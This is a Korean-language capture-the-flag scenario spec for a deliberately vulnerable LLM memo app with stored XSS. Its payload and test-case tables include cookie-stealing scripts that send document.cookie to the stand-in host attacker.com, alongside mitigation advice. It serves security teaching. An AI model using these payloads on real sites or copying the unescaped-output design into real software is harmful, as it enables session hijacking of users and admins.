# 🧩 CTF 시나리오 05: 부적절한 출력 처리 (Improper Output Handling / XSS)

<br>

## 📌 시나리오 ID

`SCENARIO_05`

## 🧠 시나리오 개요

글로벌 IT 기업 LLL Corporation은 고객 감정 케어를 위해 ‘AI 메모 응원 시스템’을 도입하였다. 이 시스템은 사용자가 작성한 메모를 기반으로 OpenAI 모델을 활용해 긍정적인 응원 메시지를 자동 생성하는 구조로 되어 있다. 메모와 응원 메시지는 HTML 형태로 렌더링되며, 관리자 J대리가 주기적으로 해당 내용을 검토한다. 그러나 이 시스템에는 사용자 입력과 AI 응답 모두에 대한 필터링이 적용되지 않아, 악성 스크립트가 그대로 반영될 수 있는 XSS 취약점이 존재한다.

공격자는 이 취약점을 악용하여 메모 입력란에 JavaScript 코드를 삽입할 수 있으며, J 대리가 메모 내용을 검토할 때 해당 스크립트가 실행된다. 이때 J 대리의 브라우저에서 저장된 관리자용 세션 쿠키가 스크립트에 의해 탈취되어 공격자에게 전달될 수 있다. 시스템 내부적으로는 Selenium 기반의 시뮬레이션 브라우저가 실행되어, 실제로 악성 스크립트가 작동하는지 판단하고 탈취된 쿠키 값을 수집하도록 설계되어 있다.

참가자는 AI 메모 응원 시스템에서 발생하는 Stored XSS 취약점을 이용해 J대리의 관리자 쿠키를 탈취하고, 이 쿠키를 인증 입력란에 제출함으로써 최종 플래그를 획득하는 것이 목표이다. 이 시나리오는 ChatGPT와 같은 LLM 기반 서비스에서도 사용자 입력 및 출력 필터링이 얼마나 중요한지를 보여주는 사례로, 프롬프트 인젝션과 유사한 맥락에서 웹 보안 위협을 학습하도록 설계되었다.

<br>

## 🎯 시나리오 목표

* 사용자 입력을 통한 악성 스크립트 삽입하기

* 관리자 권한을 가진 J 대리가 메모를 검토할 때 삽입한 악성 스크립트가 실행되도록 만들어 그의 브라우저에 저장된 세션 쿠키를 탈취하기

* 탈취한 쿠키 정보를 시스템 내 쿠키 인증 입력란에 제출하여 최종 플래그 획득하기

<br>

## 🛠️ UI 구성 요소

| 구성 요소 | 설명 |
|-----|-----|
| 👀 헤더 및 문제 설명 | 시나리오 제목, 설명 문구 표현 |
| 🎯 힌트 보기 버튼 | 버튼 클릭 시 힌트 메시지 표시 (공격 방향 가이드 제공) |
| 🧾 현재 메모 목록 | 등록된 메모와 AI 응원 메시지 목록을 확인할 수 있는 영역 |
| 💬 새 메모 작성 창 | 새 메모 내용 입력란 |
| 🤖 AI 응원 메시지 출력창 | AI가 생성한 응원 메시지를 보여주는 영역 |
| 🔑 쿠키 인증 입력창 | 탈취한 관리자 쿠키 값을 입력하여 플래그 인증을 시도하는 입력란 |
| 🏁 FLAG 제출창 | 획득한 flag를 입력하여 정답 여부 확인 |

<br>

## ⚙️ 시스템 프롬프트 요약

- 사용자가 작성한 메모 내용을 긍정적이고 따뜻한 한 줄 응원 메시지로 변경

- 간결하고 친근한 문장에 이모지를 포함하도록 안내

- AI는 항상 사용자의 감정을 이해하고 격려하는 태도로 응답

- 불필요한 장황한 설명 없이 핵심적인 응원의 말을 전달하는 데 집중


## 💥 공격 흐름 예시
### 1. 공격 기법

| 기법 | 설명 |
|-----------|------|
| `<script>` 삽입 | `<script>alert(1)</script>` 형태로 기본적인 XSS 실행                               |
| 쿠키 탈취         | `<script>location.href='http://attacker.com?c='+document.cookie</script>` |
| 이미지 오류 이벤트    | `<img src=x onerror=alert('XSS')>`                                        |
| HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
| DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |

### 2. 동작 흐름

| 단계 | 설명 |
|-----------|------|
| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨 |

### 3. 위협 요소 및 대응 방안

| 위협 | 설명 | 대응 |
|-----------|------|------|
| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |

### 4. 보안 권장 사항

* 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
* CSP 적용을 통해 인라인 및 외부 스크립트 제한
* 모든 사용자 입력에 대한 서버 측 필터링 적용
* `HttpOnly`, `Secure` 쿠키 설정으로 브라우저 접근 차단

<br>

## ✅ 테스트 케이스 예시

| 입력 | 기대 응답 |
|-----|-----|
| `안녕하세요`                                                          | 정상 HTML 생성, XSS 없음  |
| `<script>alert(1)</script>`                                      | 관리자 브라우저에서 alert 실행 |
| `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
| `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |

<br>

## 🧪 Flag 제출 방식

사용자는 획득한 Flag를 다음과 같이 제출합니다:

```
flag{answer}
```

정답이면 ✅ `"정답입니다!"` 출력  
오답이면 ❌ `"틀렸습니다."` 출력

<br>

## 🔐 모델 요구 조건

* 사용자로부터 받은 메모 내용을 바탕으로 긍정적이고 친근한 응원 메시지를 생성해야 함

* 모델은 사용자의 감정을 민감하게 파악하여 부정적인 상황에서도 희망적이고 힘이 되는 표현을 사용해야 함

* 불필요한 장황한 설명이나 부적절한 내용이 포함되지 않도록 주의해야 함

* AI 응답이 시스템에 바로 노출되어 XSS 취약점이 될 수 있음을 감안하여, 가능한 한 안전한 텍스트 생성에 중점을 두어야 함